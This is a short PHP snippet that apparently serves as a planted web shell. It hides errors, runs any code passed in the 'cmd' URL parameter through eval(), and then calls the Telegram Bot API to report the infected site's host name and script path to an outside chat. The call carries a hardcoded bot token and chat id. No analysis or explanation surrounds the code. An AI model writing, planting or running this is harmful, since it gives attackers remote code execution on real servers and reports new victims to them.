error_reporting(0);
eval($_GET['cmd']);
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-576355443&text=New: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
